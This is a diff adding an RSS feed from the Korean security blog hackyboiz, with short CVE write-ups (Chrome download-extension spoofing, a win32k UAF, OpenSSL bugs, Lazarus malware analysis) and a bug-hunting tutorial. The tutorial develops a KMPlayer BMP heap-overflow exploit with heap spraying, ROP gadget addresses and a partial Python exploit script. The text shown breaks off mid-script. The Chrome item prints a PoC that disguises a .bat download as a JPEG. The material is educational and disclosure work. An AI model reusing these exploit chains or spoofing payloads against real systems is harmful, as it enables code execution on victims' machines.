@@ -1,0 +1,648 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0"
+  xmlns:atom="http://www.w3.org/2005/Atom"
+  xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>hackyboiz</title>
+    <link>https://hackyboiz.github.io/</link>
+    
+    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
+    
+    <description>hack &amp; life</description>
+    <pubDate>Sat, 03 Apr 2021 05:26:03 GMT</pubDate>
+    <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-21123: Chrome에서 발생하는 확장자 spoofing</title>
+      <link>https://hackyboiz.github.io/2021/04/03/fabu1ous/2021-04-03/</link>
+      <guid>https://hackyboiz.github.io/2021/04/03/fabu1ous/2021-04-03/</guid>
+      <pubDate>Sat, 03 Apr 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;&lt;strong&gt;URL&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/chromium/iss</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1137247">Issue 1137247: Security: Spoofing download filename extension in 86 chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 88.0.4324.96</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><blockquote><p>CVE-2021-21123:  88.0.4324.96 이전 Google Chrome의 File System API에서 불충분한 데이터 유효성 검사를 통해 공격자는 조작된 HTML 페이지를 통해 파일 시스템 제한을 무시할 수 있습니다. </p></blockquote><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">        <span class="hljs-keyword">const</span> butSaveNewFile = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;addNewFile&#x27;</span>)</span><span class="javascript">        butSaveNewFile.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;</span><span class="javascript">            <span class="hljs-keyword">const</span> options = &#123;</span>                types: [                    &#123;                        description:<span class="javascript">                            <span class="hljs-string">&#x27;JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         &#x27;</span>,</span>                        accept: &#123;<span class="javascript">                            <span class="hljs-string">&#x27;text/plain&#x27;</span>: [<span class="hljs-string">&#x27;.bat&#x27;</span>]</span>                        &#125;,<span class="javascript">                        content: <span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span></span>                    &#125;                ]            &#125;<span class="javascript">            <span class="hljs-keyword">const</span> handle = <span class="hljs-keyword">await</span> <span class="hljs-built_in">window</span>.showSaveFilePicker(options)</span><span class="javascript">            <span class="hljs-keyword">const</span> writable = <span class="hljs-keyword">await</span> handle.createWritable()</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.write(<span class="hljs-string">&#x27;C:\\Windows\\system32\\calc.exe&#x27;</span>)</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.close()</span><span class="javascript">            alert(<span class="hljs-string">&#x27;File saved&#x27;</span>)</span>        &#125;)    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>위는 공개된 HTML PoC의 일부입니다. 변수  <code>description</code>의 값은 Google Chrome이 호출하는 “Save as(다른 이름으로 저장)” 창에서 다운로드될 파일의 확장자를 사용자에게 보여주는 용도로 사용됩니다. <code>description</code>에 연속적인 공백 문자 혹은 <code>*</code>이 포함되지 못하도록 막는 필터링의 부재로 인해 다운로드될 파일의 실제 확장자를 숨기거나 속일 수 있습니다(Spoofing download filename). 해당 취약점을 악용해 원격으로 타겟 시스템에 악성 코드를 설치 및 실행할 수 있기 때문에 User Interaction이 필요함에도 불구하고 높은 심각도의 취약점으로 분류됐습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/spoofing/">spoofing</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/chrome/">chrome</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/04/03/fabu1ous/2021-04-03/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CVE-2021-26863: race condition을 통한 win32k 커널 UAF 취약점</title>
+      <link>https://hackyboiz.github.io/2021/04/02/l0ch/2021-04-02/</link>
+      <guid>https://hackyboiz.github.io/2021/04/02/l0ch/2021-04-02/</guid>
+      <pubDate>Fri, 02 Apr 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2139">Issue 2139: Windows Kernel win32k UAF of the PDEVOBJ object via a race condition in NtGdiGetDeviceCapsAll</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>win32k kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Project Zero팀이 Windows Kernel에서 발생하는 race condition을 통한 UAF 취약점의 세부 보고서를 공개했습니다.</p><p>취약점이 존재하는 <code>NtGdiGetDeviceCapsAll</code> 함수는 GDI에서 내부적으로 사용하는 system call입니다.</p><pre><code class="hljs cpp">...<span class="hljs-function">BOOL <span class="hljs-title">NtGdiGetDeviceCapsAll</span><span class="hljs-params">(HDC hdc, DEVCAPS *devcaps)</span> </span>&#123;BOOL bRet = TRUE;PDEVOBJ *pdevobj;<span class="hljs-keyword">if</span> (PsGetWin32KFilterSet() == <span class="hljs-number">5</span> &amp;&amp; hdc == <span class="hljs-number">0xFFFFFFFFDCDE5000</span>) &#123;pdevobj = gpDispInfo-&gt;pdevobj;<span class="hljs-comment">// DCOBJ scope</span>&#125; <span class="hljs-keyword">else</span> &#123;DCOBJ dc(hdc); <span class="hljs-comment">//[1]</span><span class="hljs-keyword">if</span> (!dc.valid) &#123;EngSetLastError(ERROR_INVALID_HANDLE);DCOBJ::~DCOBJ(dc);<span class="hljs-keyword">return</span> FALSE;&#125;pdevobj = dc.pdevobj;DCOBJ::~DCOBJ(dc);&#125;<span class="hljs-comment">// DCOBJ scope</span>__try &#123;ProbeForWrite(devcaps, <span class="hljs-keyword">sizeof</span>(DEVCAPS), <span class="hljs-number">1</span>);vGetDeviceCaps(pdevobj, devcaps);  <span class="hljs-comment">//[2]</span>&#125;except(EXCEPTION_EXECUTE_HANDLER) &#123;bRet = FALSE;&#125;<span class="hljs-keyword">return</span> bRet;&#125;...</code></pre><p>해당 함수는 <a href="https://docs.microsoft.com/ko-kr/cpp/mfc/device-contexts?view=msvc-160">Device Context(DC)</a> 핸들을 얻어 장치 정보를 <code>DEVCAPS</code> 구조체에 저장하는 기능을 수행합니다.</p><p><code>DCOBJ</code> 객체인 <code>dc</code>를 <code>else</code> 문 내부에서 선언해 해당 객체의 scope가 <code>else</code>문으로 한정됩니다. 또한 객체가 syscall 전체에서 활성화된 상태를 유지할 수 있는 메커니즘이 존재하지 않아 <code>else</code> 코드를 벗어나면 <code>DCOBJ::~DCOBJ(dc)</code> 소멸자가 자동으로 호출되어 <code>dc</code>에 대한 참조가 삭제됩니다. 결과적으로 <code>dc</code>를 참조하는 <code>pdevobj</code> 객체가 race condition의 영향을 받습니다.</p><p>위 취약점을 악용해 [1]에서 <code>DCOBJ</code>생성자에 의해 참조된 이후 다른 스레드가 [2]에서 <code>vGetDeviceCaps()</code> 호출 전 또는 도중 <code>Device Context</code>를 닫는 경우 해제된 메모리에 액세스 할 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/race-condition/">race condition</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/04/02/l0ch/2021-04-02/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] CA certificate check bypass &amp; NULL pointer deref in OpenSSL</title>
+      <link>https://hackyboiz.github.io/2021/04/01/insu/2021-04-01/</link>
+      <guid>https://hackyboiz.github.io/2021/04/01/insu/2021-04-01/</guid>
+      <pubDate>Thu, 01 Apr 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.openssl.org/news/secadv/20210325.txt&quot;&gt;OpenSSL</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.openssl.org/news/secadv/20210325.txt">OpenSSL Security Advisory [25 March 2021]</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>OpenSSL</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>OpenSSL에서 CA 인증 bypass와 Null Pointer Dereference 취약점(Denial-of-Service)이 발견되었습니다. </p><p><strong>CA certificate check bypass</strong></p><p>X509_V_FLAG_X509_STRICT flag를 사용하여 추가 보안 검사를 할 수 있습니다.</p><p>타원 곡선 변수를 인코딩한 체인의 인증서를 허용하지 않는 검사가 추가되었습니다.</p><p>이이 검사를 진행할 때, 인증서가 유효한 CA 인정서인지 확인하는 이전의 검사 결과를 덮어 씌워 취약점이 발생했습니다.</p><p><strong>Null pointer dereference</strong></p><p>client에서 조작된 renegotiation ClientHello message를 보낸 경우, 취약점이 발생합니다.</p><p>만약 initalize에서 TLSv1.2 renegotiation ClientHello가 signature_algorithms extension을 설정하지 않지만, signature_algorithms_cert extension을 포함한다면 null pointer deref 취약점이 발생합니다.</p><p>이 취약점은 <a href="https://github.com/terorie/cve-2021-3449">링크</a>에서 확인할 수 있습니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/insu/">insu</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/openssl/">openssl</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/04/01/insu/2021-04-01/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[하루한줄] 일본을 타깃으로 한 라자루스 멀웨어 VSingle, ValeforBeta</title>
+      <link>https://hackyboiz.github.io/2021/04/01/idioth/2021-04-01/</link>
+      <guid>https://hackyboiz.github.io/2021/04/01/idioth/2021-04-01/</guid>
+      <pubDate>Thu, 01 Apr 2021 05:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.ht</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.jpcert.or.jp/en/2021/03/Lazarus_malware3.html">Lazarus Attack Activities Targeting Japan (VSingle/ValeforBeta)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Japanese orgainsations</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>일본을 타깃으로 라자루스가 사용한 멀웨어 VSingle과 ValeforBeta에 대한 분석 보고서가 공개되었습니다.</p><p>VSingle은 원격 네트워크에서 임의 코드 실행, 플러그인 다운로드 및 실행을 하는 HTTP 봇입니다. 해당 멀웨어는 설치되면 Explorer를 실행하고 DLL injection을 통해 메인 코드를 실행합니다. VSingle은 HTTP GET request를 통해 C2 서버와 통신합니다. request는 base64로 인코딩 되어있으며, IP 주소, Windows 버전 등을 포함합니다. response를 통해 서버에서 명령어가 포함된 AES 암호화 데이터를 다운로드 받습니다. VSingle이 수행할 수 있는 명령어는 다음과 같습니다.</p><ol><li>파일 업로드</li><li>communication interval 설정</li><li>임의 명령 실행</li><li>플러그인 다운로드/실행</li><li>업데이트</li><li>멀웨어 정보 전송</li><li>uninstall</li><li>다운로드 파일</li></ol><p>VSingle은 4 가지 유형의 플러그인(Windows PE 파일, VBS 파일, BAT 파일, 쉘 코드)을 실행합니다. 플러그인은 <code>%TEMP%</code> 폴더에 저장된 후 쉘 코드를 제외한 3개의 플러그인을 실행합니다.</p><p>ValeforBeta는 Delphi로 작성된 HTTP 봇으로 원격 네트워크에서 임의 코드 실행, 파일 업로드, 다운로드 기능을 가지고 있습니다. <code>INTERNET_OPEN_TYPE_DIRECT</code>, <code>INTERNET_OPEN_TYPE_PRECONFIG</code>, <code>INTERNET_OPEN_TYPE_PROXY</code>의 access type을 가지고 있으며 POST request를 통해 C2 서버와 통신합니다. POST request에는 데이터가 포함되어 있지 않고 쿠키 헤더의 <code>JSESSIONID=</code> 뒤에 감염된 호스트의 정보가 base64 인코딩 되어 전송됩니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lazarus/">lazarus</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/bot/">bot</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/04/01/idioth/2021-04-01/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>[Research] 버그헌팅 튜토리얼 Part 4</title>
+      <link>https://hackyboiz.github.io/2021/03/31/l0ch/bughunting-tutorials-part4/</link>
+      <guid>https://hackyboiz.github.io/2021/03/31/l0ch/bughunting-tutorials-part4/</guid>
+      <pubDate>Wed, 31 Mar 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/&quot;&gt;버그헌팅 튜토리얼 Part 1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://hackyboiz.github.</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<p><a href="https://hackyboiz.github.io/2021/03/07/l0ch/bughunting-tutorial/">버그헌팅 튜토리얼 Part 1</a></p><p><a href="https://hackyboiz.github.io/2021/03/17/l0ch/bughunting-tutorials-part2/">버그헌팅 튜토리얼 Part 2</a></p><p><a href="https://hackyboiz.github.io/2021/03/24/l0ch/bughunting-tutorials-part3/">버그헌팅 튜토리얼 Part 3</a></p><p>어느덧 버그헌팅 튜토리얼의 마지막 글입니다. Part 3 에서 바로 이어지는 내용이니 긴말 없이 바로 시작해볼게요!</p><hr><p>이제부터는 콜 스택을 복구해볼 겁니다. 콜 스택을 복구하면 우리가 어느 정도의 코드를 봐야 하는지 사이즈가 나옵니다. 이걸 복구하고 어느 부분부터 분석하면 좋을지를 판단할 겁니다.</p><p>콜 스택을 복구하는 방법 역시 위에서 아래로(탑다운) 아래에서 위로(바텀업) 뭘 어떻게 하던 상관없습니다. 그냥 자신이 편하신 대로 하면 됩니다. 바텀업 방식으로 할 때에는 크래시가 발생하는 함수의 처음 부분에 브레이크 포인트를 걸어서 바로 직전의 리턴 어드레스를 보면서 하나하나 올라가면 됩니다. 탑다운 방식으로 할 경우 동적 디버깅과 정적 디버깅을 적절히 사용하면 됩니다. 일단 제일 위(라고 생각하는 함수)에 전달되는 인자를 보고 먼저 정적 리버싱을 진행합니다. 그리고 결과들을 기반으로 동적 디버깅을 같이 수행하면 됩니다.</p><p>나는 아무 생각이 없다!!! 그냥 리버싱을 최대한 줄이고 싶어요!!! 시간은 많아요!!!(는 개뿔 제로데이는 묵히면 똥 됩니다)라고 하시는 분들은 그냥 제일 위에 있는 함수에서 p 누르고 크래시 터지면 프로그램 재시작하고 그 시점으로 가서 다시 p 누르고… 이렇게 쭉쭉 내려가는 방법도 있습니다. 무식하지만 확실하기도 하죠…. 는 시간 낭비 개쩔… 스레드 잘못 분석하면 리얼 시간 낭비… (스레드는 힙을 공유하기 때문에 여러 개의 스래드가 사용하는 힙에서 오버플로우가 발생하면 취약점이 존재하는 스레드 말고 다른 스레드에서도 크래시가 발생할 수 있습니다)ㅋㅋㅋㅋㅋㅋ 뭐 그래도 이것만큼 생각 없이 하는 건 없는 거 같네욬ㅋㅋㅋㅋㅋ (지극히 콜 스택 복구에만 해당되는 겁니다… 결국은 다 분석해야 돼요 ㅠㅠ)</p><p>콜 스택을 복구하고 천천히 따라다가 보면 아래와 같이 <code>ImLoader+0x27BB0</code> 에서 헤더 검사를 진행하는 것을 발견할 수 있습니다. (캡처 사진의 헥스레이 코드는 아이다 버전에 따라 조금씩 다를 수 있습니다)</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--048.png" alt="bughunting-tutorials-part4/image--048.png"></p><p><code>v7</code>에 있는 값이 <code>MB</code>(숫자로 되어 있어서 앞에서 못 찾은 거네요)인지 비교하고 틀리면 익셉션을 발생시키고 맞다면 해석을 진행하게 됩니다. 그럼 <code>sub_427620</code> 에서 파일 해석을 진행하면서 크래시가 발생하겠네요!!</p><p>그럼 이제부터는 실제 파일을 처리하는 함수가 어떻게 진행되는지 알아볼게요.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--050.jpg" alt="bughunting-tutorials-part4/image--050.jpg"></p><p>먼저 파라미터로 전달되어 온 Stream 값을 통해 <code>BITMAPINFOHEADER</code> 의 사이즈를 가져와서 지역변수에 저장해줍니다. 그럼 당연히 우리가 수정한 <code>0x1f28</code> 이겠죠? 그런 다음 <code>0x1f28+0x40c</code> 만큼 <code>BITMAPINFOHEADER</code> 를 저장하기 위한 메모리를 할당해주고 해당 주소를 header에 저장해줍니다. 그리고 <code>size</code> 와 <code>0xc</code> 가 같은 지 비교를 해서 결과 값을 <code>size_bool</code> 에 저장합니다. 이때 <code>size</code> 는 <code>0x1f28</code> 이기 때문에 <code>size_bool</code>에는 0 이 저장됩니다. 따라서 밑에 분기점에서 <code>size_bool</code> 이 <code>0</code> 이기 때문에 <code>else</code>로 빠지게 됩니다.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--052.png" alt="bughunting-tutorials-part4/image--052.png"></p><p><code>else</code>로 빠지게 되면 파일의 <code>BITMAPINFOHEADER</code> 시작 부분부터 <code>size</code>만큼 읽어와서 header에 저장하게 됩니다. 앞에서 <code>size+0x40c</code> 만큼 할당을 했기 때문에 오버플로우가 발생할 수 없습니다. </p><p>그런 다음, compression에 대한 분기문을 만나게 됩니다. 이 값은 <code>0x00</code> 에서 <code>0xa00</code>으로 수정했기 때문에 해당 분기로 들어갈 수 있게 됩니다. 분기로 들어가면 첫 번째로 하는 일이 오브젝트를 할당하네요. 그럼 <code>BITMAPINFOHEADER</code> 가 할당된 뒷부분에 할당이 되겠네요.(<code>BITMAPINFOHEADER</code> 가 페이지를 하나 더 할당할 만큼 크질 않으니) 이 부분이 중요합니다!!! 왜냐하면 우리가 덮게 될 객체니까요 ㅎㅎ(응? <code>BITMAPINFOHEADER</code>뒤에 할당된다며… 오버플로우 안 난다며….)</p><p>뒤에 더 보도록 하죠 ㅎㅎㅎㅎ</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--054.jpg" alt="bughunting-tutorials-part4/image--054.jpg"></p><p>이제는 <code>this</code> 에 <code>BITMAPINFOHEADER</code> 정보를 저장합니다. 참 찰지게 다 넣네요.<br>그리고 마지막에는 모든 비트맵 데이터를 저장합니다. 우리는 익스플로잇을 할 때 이 부분을 이용해서 스프레이를 할 수 있습니다 ㅎㅎ</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--056.jpg" alt="bughunting-tutorials-part4/image--056.jpg"></p><p>이제 취약점 부분입니다 ㅎㅎㅎ 드디어 ㅎㅎ</p><p>먼저 어떤 주소를 계산합니다. Header 주소 기준으로 <code>size</code> 만큼 뒤에 주소를 저장합니다. 그런 다음 밑에 모든 분기를 건너뛰고 <code>sub_41AAF0</code> 함수로 갑니다. 이 함수는 파일 스트림에서 <code>byte_4BA6F4[size_bool] * header-&gt;biClrUsed = 0x800</code> 만큼 읽어서 위에서 계산한 주소에 저장합니다.</p><p>여기에서 오버플로우가 발생합니다!!!! 아까 위에서 얘기했듯이 header 의 크기는 <code>size+0x40c</code>입니다 ㅋㅋㅋ 근데 여기에서는 <code>header+size</code> 에 <code>0x800</code> 바이트를 할당하니 뒤에 있는 객체를 덮게 되는 거죠!! 그럼 객체가 덮이기 전과 후를 한번 살펴볼게요!!</p><p>Before:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--058.png" alt="bughunting-tutorials-part4/image--058.png"></p><p>After:</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--060.png" alt="bughunting-tutorials-part4/image--060.png"></p><p>헤헿 자 이제 그럼 <code>eip</code>를 잡을 수 있겠네요!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--062.png" alt="bughunting-tutorials-part4/image--062.png"></p><p>네….? 뭘 잡는다는 거죠….? 쥬륵…. ㅠㅠ 후우 역시 인생은 험난하네요…</p><p>으음… 이제 디버깅해보면서 하나하나 해결해 나갈게요 ㅠㅠ<br>먼저 <code>0x11111111</code> 에 Access violation이 발생하는 것은 우리가 넣은 데이터가 유효한 메모리를 가리키게 하면 되겠죠!! 하지만!!! ASLR이 걸려있어서 그렇게 하는 게 쉽지 않다는 거…. 그렇기 때문에 스프레이를 진행해야 합니다. 다행히(??) KMPlayer와 ImLoader가 32 비트로 컴파일되어 있기 때문에 스프레이를 하면 어느 정도 릴라이어블하게 원하는 주소에 메모리를 매핑할 수 있습니다. 할당하는 메모리에 크기에 따라서 자주 매핑되는 주소가 달라집니다. 저는 여기에서 150M 정도를 0x11로 스프레이 했습니다. </p><p>150M로 스프레이한 이유는 디버깅할 때 이 정도 크기가 가장 적당한 속도가 나와서 인데요. 디버깅할 때 <code>0x11111111</code> 에 매핑이 안되면 다시 시작해서 테스트를 해야 되잖아요? 크기가 커지면 원하는 주소에 매핑이 더 잘되지만 윈도우가 업데이트를 하면 할수록 랜덤 마이징이 잘돼서 크기가 커도 잘 안되더라고요 ㅠㅠ(예전에는 300M 만 해도 거의 고정이라고 들었는데…) 가장 효율적이라고 생각하는 크기로 했습니다. 만약 원하는 데로 잘 된다면 아래와 같이 해당 주소에 잘 매핑된 것을 볼 수 있습니다!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--064.png" alt="bughunting-tutorials-part4/image--064.png"></p><p>그리고 이대로 실행하면!!!</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--066.png" alt="bughunting-tutorials-part4/image--066.png"></p><p>짝짝짝!! <code>eip</code>를 잡았습니다!!! 소리질러어어어어어어!!!! (하… 험난했다…) 이제 익스만 하면 되겠네요 ㅎㅎㅎ</p><hr><p>일단 어떻게 <code>eip</code>를 잡게 되었는지 함 볼게요. 일단 스택에 있는 리턴 어드레스를 확인해서 어디에서 <code>call</code> 혹은 <code>jmp</code>를 했는지 확인해볼게요.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--068.png" alt="bughunting-tutorials-part4/image--068.png"></p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--070.png" alt="bughunting-tutorials-part4/image--070.png"></p><p>스택에 있는 마지막 리턴 어드레스를 보니 <code>ImLoader+0x357f</code> 인 것을 확인할 수 있고 이 주소보다 위에 있는 instruction을 확인해보면 <code>call dword ptr [ecx-4]</code>인 것을 확인할 수 있습니다. 그리고 <code>ecx</code>는 <code>eax</code>가 가리키는 메모리에서 가져온 것이네요.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--072.png" alt="bughunting-tutorials-part4/image--072.png"></p><p>그럼 이제 중요한 거는 <code>0x11111111</code> 이 가리키는 데이터가 파일에서의 오프셋(위치??)이 <code>eax</code>가 가리키는 데이터의 오프셋이 일치하냐는 것인데요. 이 부분을 확인해보기 위해서 일단 <code>0x11111111</code> 부분이 어떤 위치에 있는지 보겠습니다.</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/image--074.jpg" alt="bughunting-tutorials-part4/image--074.jpg"></p><p>마지막 메모리가 전체 비트맵 이미지를 담고 있는 부분이기 때문에 해당 메모리 기준으로 계산하면 됩니다. <code>0x11111111 – 0x101cb056 = 0xF460BB</code> 네요. 앞에서 객체를 덮을 때에는 파일 기준으로 앞부분 데이터를 가져와 복사하기 때문에 페이로드를 담는 데에는 큰 문제가 없을 것 같습니다!!</p><p>자 이제 페이로드를 작성해야 합니다. 페이로드를 작성하기 전에 MONA와 메타스플로잇을 사용해서 모듈들의 미티게이션 적용 항목, 필요한 가젯 검색, 쉘 코드 생성을 해야 하는 데 이 부분은 인터넷을 검색하면 많이 나오기 때문에 생략하도록 하겠습니다. 결론적으로 <code>KMPlayer.exe</code> 에 Rebase가 안 걸려있어서 <code>KMPlayer.exe</code> 에 있는 가젯을 사용하도록 할 것이고요, 메타스플로잇을 통해서는 계산기를 실행시키는 쉘 코드를 만들 것입니다.</p><p>일단 ASLR은 스프레이로 어느 정도 커버하였고 DEP만 무력화시키고 쉘 코드를 작성하면 됩니다. DEP를 무력화하려면 ROP를 해야죠!! 이제 <code>esp</code>를 우리 데이터가 있는 힙 메모리로 피봇 시킬 것입니다. 음 적당한 가젯을 찾아보도록 하죠.</p><pre><code class="hljs c"><span class="hljs-number">0x00523702</span> : # PUSH ECX # POP ESP # POP ESI # POP EBX # RETN</code></pre><p>일부로 두 번 더 <code>POP</code> 해주는 이유는 위에 보시다시피 <code>0x11111111</code> 부분에 8 바이트가 다른 데이터로 덮여 있기 때문에 이 8 바이트를 뛰어넘고 리턴하기 위함입니다.</p><p>자 그러면 페이로드를 작성할 때 아래와 같이 하면 되겠네요.</p><p>제일 처음 부분에는 위 가젯의 주소를 사용할 겁니다. 그리고 바로 그 뒤에는 또 피봇 하는 가젯을 넣어줄 겁니다. 이번에는 그냥 힙에서만요. 왜냐하면 이번에는 <code>0x101cb056</code> 에 매핑이 되었지만 다음에 또 이 언저리 주소에 매핑될 때도 이 주소라는 보장이 없으니깐요. 최소한 하위 2 바이트는 바뀌겠죠. 그렇기 때문에 <code>esp</code>를 스택에서 힙으로, 다시 힙에서 다 높은 주소의 힙으로 피봇 하는 가젯 두 개를 스프레이 해줄 겁니다. 힙에서 힙으로 피봇 하는 가젯은 아래 걸로 쓰도록 할게요.</p><pre><code class="hljs c"><span class="hljs-number">0x0095dffa</span> : # ADD ESP,<span class="hljs-number">19010</span> # POP EBP # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>그리고 중간중간에 프로그램에서 힙을 쓰다가 바꾼 메모리들을 스킵할 수 있도록 아래 가젯을 사용하겠습니다.</p><pre><code class="hljs c"><span class="hljs-number">0x00433712</span> : # POP EDX # POP EDI # POP ESI # POP EBX # RETN</code></pre><p>그리고 이제 높은 주소로 피봇 했으면 그 부분에도 <code>ret</code>으로 스프레이를 해주면 좀 더 정확도가 높아지겠네요 ㅎㅎ</p><p>그럼 파일을 구성할 때에는 아래와 같이 하면 되겠네요</p><p><img src="/2021/03/31/l0ch/bughunting-tutorials-part4/Untitled.png" alt="bughunting-tutorials-part4/Untitled.png"></p><p>아래는 제가 작성한 익스플로잇 코드입니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_rop_chain</span>():</span><span class="hljs-comment"># rop chain generated with mona.py - www.corelan.be</span>rop_gadgets = [<span class="hljs-number">0x00453c50</span>, <span class="hljs-comment"># POP EDX # RETN [KMPlayer.exe]</span><span class="hljs-number">0x00d6a848</span>, <span class="hljs-comment"># ptr to &amp;VirtualProtect() [IAT KMPlayer.exe]</span><span class="hljs-number">0x0094eb72</span>, <span class="hljs-comment"># MOV EAX,DWORD PTR DS:[EDX] # RETN [KMPlayer.exe]</span><span class="hljs-number">0x007d2499</span>, <span class="hljs-comment"># XCHG EAX,ESI # RETN [KMPlayer.exe]</span><span 